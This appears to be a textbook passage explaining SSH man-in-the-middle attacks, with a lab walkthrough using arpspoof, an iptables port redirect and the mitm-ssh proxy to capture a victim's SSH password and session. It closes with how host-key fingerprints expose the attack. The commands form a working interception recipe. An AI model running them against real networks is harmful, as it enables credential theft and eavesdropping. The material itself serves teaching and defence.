A man-in-the-middle (MitM) attack is a clever way to circumvent encryption
The attacker sits between the 2 communicating parties, with each party believing they are communicating with the other party, but both are communicating with the attacker

When an encrypted connection between the 2 parties is established, a secret key is generated and transmitted using an asymmetric cipher
Usually, this key is used to encrypt further communication between the 2 parties
Since the key is securely transmitted and the subsequent traffic is secured by the key, all of this traffic is unreadable by any would-be attacker sniffing these packets

However, in a MitM attack, party A believes that she is communicating with B, and party B believes he is communicating with A, but in reality, both are communicating with the attacker
So, when A negotiates an encrypted connection with B, A is actually opening an encrypted connection with the attacker, which means the attacker securely communicates with an asymmetric cipher and learns the secret key
Then the attacker just needs to open another encrypted connection with B, and B will believe that he is communicating with A, as shown in the following illustration:

   
    ____________           Encrypted      ____________ 
   |            |          Communication |            |
   |            |          with Key 1    |            |
   |  Attacker  |<---------------------->|  System A  |
   |            |Appears to              |            |
   |____________|be System B             |____________|
Appears /|\
to be    |      
System A |
         |
         |
         |Encrypted            Systems A and B both believe
         |Communication        they are communicating with
         |with Key 2           each other
         |
    ____\|/______
   |            |
   |            |
   |  System B  |
   |            |
   |____________|
   
This means that the attacker actually maintains 2 separate encrypted communication channels with 2 separate keys
Packets from A are encrypted with the first key and sent to the attacker, which A believes is actually B
The attacker then decrypts these packets with the first key and re-encrypts them with the second key
Then the attacker sends the newly encrypted packets to B, and B believes these packets are actually being sent by A
By sitting in the middle and maintaining 2 separate keys, the attacker is able to sniff and even modify traffic between A and B without either side being the wiser

After redirecting traffic using an ARP cache poisoning tool, there are a number of SSH man-in-the-middle attack tools that can be used
Most of these are just modifications to the exising openssh source code
One notable example is the aptly named mitm-ssh package, by Claes Nyberg, which has been included on the LiveCD

This can all be done with the ARP redirection technique from "Active Sniffing" on Networking Chapter and a modified openssh package aptly called mitm-ssh
There are other tools that do this; however, Claes Nyberg's mitm-ssh is publicly available and the most robust
The source package is on the LiveCD in /usr/src/mitm-ssh, and it has already been built and installed
When running, it accepts connections to a given port and then proxies these connections to the real destination IP address of the target SSH server
With the help of arpspoof to poison ARP caches, traffic to the target SSH server can be redirected to the attacker's machine running mitm-ssh
Since this program listens on localhost, some IP filtering rules are needed to redirect the traffic

In the example below, the target SSH server is at 192.168.42.72
When mitm-ssh is run, it will listen on port 2222, so it doesn't need to be run as root
The iptables command tells Linux to redirect all incoming TCP connections on port 22 to localhost 2222, where mitm-ssh will be listening
__________________________________________________________________________________
reader@hacking:~ $ sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222

reader@hacking:~ $ sudo iptables -t nat -L
Chain PREROUTING (policy ACCEPT)
target      prot  opt source   destination    
REDIRECT    tcp   --  anywhere anywhere     tcp dpt:ssh redir ports 2222 

Chain POSTROUTING (policy ACCEPT)
target      prot  opt source   destination    

Chain OUTPUT (policy ACCEPT)
target      prot  opt source   destination    

reader@hacking:~ $ mitm-ssh

..
/|\      SSH Man In The Middle [Based on OpenSSH_3.9p1]
_|_      By CMN <cmn@darklab.org>

Usage: mitm-ssh <non-nat-route> [option(s)]

Routes:
<host>[:<port>] - Static route to port on host
                  (for non NAT connections)

Options:
-v             - Verbose output
-n             - Do not attempt to resolve hostnames
-d             - Debug, repeat to increase verbosity
-p port        - Port to listen for connections on
-f configfile  - Configuration file to read

Log Options:
-c logdir   - Log data from client in directory 
-s logdir   - Log data from server in directory 
-o file     - Log passwords to file 

reader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222
Using static route to 192.168.42.72:22
SSH MITM Server listening on 0.0.0.0 port 2222.
Generating 768 bit RSA key.
RSA key generation complete.
__________________________________________________________________________________

Then in another terminal window on the same machine, Dug Song's arpspoof tool is used to poison ARP caches and redirect traffic destined for 192.168.42.72 to our machine, instead.

__________________________________________________________________________________
reader@hacking:~ $ arpspoof
Version: 2.3
Usage: arpspoof [-i interface] [-t target] host

reader@hacking:~ $ sudo arpspoof -i eth0 192.168.42.72
0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c
0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c
0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c
__________________________________________________________________________________

And now the MitM attack is all set up and ready for the next unsuspecting victim
The output below is from another machine on the network(192.168.42.250), which makes an SSH connection to  192.168.42.72.

On Machine 192.168.42.250 (tetsuo), Connecting to 192.168.42.72 (loki)
__________________________________________________________________________________
iz@tetsuo:~ $ ssh jose@192.168.42.72
The authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.
RSA key fingerprint is 84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.
jose@192.168.42.72's password:
Last login: Mon Oct 1 06:32:37 2007 from 192.168.42.72
Linux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686

jose@loki:~ $ ls -a
. .. .bash_logout .bash_profile .bashrc .bashrc.swp .profile Examples
jose@loki:~ $ id
uid=1001(jose) gid=1001(jose) groups=1001(jose)
jose@loki:~ $ exit
logout
Connection to 192.168.42.72 closed.
__________________________________________________________________________________

Everything seems okay, and the connection appeared to be secure
However, the connection was secretly routed through the attacker's machine, which used a separate encrypted connection to back to the targeted server
Back on the attacker's machine, everything about the connection has been logged

On the attacker's machine
__________________________________________________________________________________
reader@hacking:~ $ sudo mitm-ssh 192.168.42.72 -v -n -p 2222
Using static route to 192.168.42.72:22
SSH MITM Server listening on 0.0.0.0 port 2222.
Generating 768 bit RSA key.
RSA key generation complete.
WARNING: /usr/local/etc/moduli does not exist, using fixed modulus
[MITM] Found real target 192.168.42.72:22 for NAT host 192.168.42.250:1929
[MITM] Routing SSH2 192.168.42.250:1929 -> 192.168.42.72:22
[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22
SSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt
[MITM] Connection from UNKNOWN:1929 closed

reader@hacking:~ $ ls /usr/local/var/log/mitm-ssh/
passwd.log
ssh2 192.168.42.250:1929 <- 192.168.42.72:22
ssh2 192.168.42.250:1929 -> 192.168.42.72:22

reader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/passwd.log
[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22
SSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt

reader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/ssh2*
Last login: Mon Oct 1 06:32:37 2007 from 192.168.42.72
Linux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686
jose@loki:~ $ ls -a
. .. .bash_logout .bash_profile .bashrc .bashrc.swp .profile Examples
jose@loki:~ $ id
uid=1001(jose) gid=1001(jose) groups=1001(jose)
jose@loki:~ $ exit
logout
__________________________________________________________________________________

Since the authentication was actually redirected, with the attacker's machine acting as a proxy, the password sP#byp%srt could be sniffed
In addition, the data transmitted during the connection is captured, showing the attacker everything the victim did during the SSH session

The attacker's ability to masquerade as either party is what makes this type of attack possible
SSL and SSH were designed with this in mind and have protections against identity spoofing
SSL uses certificates to validate identity, and SSH uses host fingerprints
If the attacker doesn't have the proper certificate or fingerprint for B when A attempts to open an encrypted communication channel with the attacker, the signatures won't match and A will be alerted with a warning

In the previous example, 192.168.42.250 (tetsuo) had never previously communicated over SSH with 192.168.42.72 (loki) and therefore didn't have a host fingerprint
The host fingerprint that it accpeted was actually the fingerprint generated by mitm-ssh
If, however, 192.168.42.250 (tetsuo) had a host fingerprint for 192.168.42.72 (loki), the whole attack would have been detected, and the user would have been presented with a very blatant warning:

__________________________________________________________________________________
iz@tetsuo:~ $ ssh jose@192.168.42.72
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that the RSA host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.
Please contact your system administrator.
Add correct host key in /home/jon/.ssh/known_hosts to get rid of this message.
Offending key in /home/jon/.ssh/known_hosts:1
RSA host key for 192.168.42.72 has changed and you have requested strict checking.
Host key verification failed.
__________________________________________________________________________________

The openssh client will actually prevent the user from connecting until the old host fingerprint has been removed
However, many Windows SSH clients don't have the same kind of strict enforcement of these rules and will present the user with an "Are you sure you want to continue?" dialog box
An uninformed user might just click right through the warning